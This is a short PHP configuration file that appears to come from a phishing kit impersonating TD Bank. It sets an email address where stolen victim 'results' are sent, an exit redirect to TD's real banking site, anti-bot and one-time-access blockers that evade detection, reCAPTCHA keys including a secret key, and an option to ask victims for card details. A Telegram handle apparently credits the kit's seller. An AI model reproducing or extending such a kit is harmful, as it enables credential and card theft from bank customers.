<?php
error_reporting(0);
// @Kr3pto on telegram
$to = "email@email.com"; // your results email here
$saveonhost = 0; // save a copy of results on host // 1 for enable and 0 for disable

$ExitLink = "https://www.td.com/ca/en/personal-banking/";


// some blockers

$One_Time_Access = 1; //1 for enable and 0 for disable

$internal_antibot = 1;

//recaptcha settings
$site_key = '6LeSbREfAAAAAP6y8FTcDl6kgqvYVChvaO9zGYVc';
$secret_key = '6LeSbREfAAAAAGQ0fM64kP1BqPncZlK7JsCKRRgF';


$ask_card = 0;


?>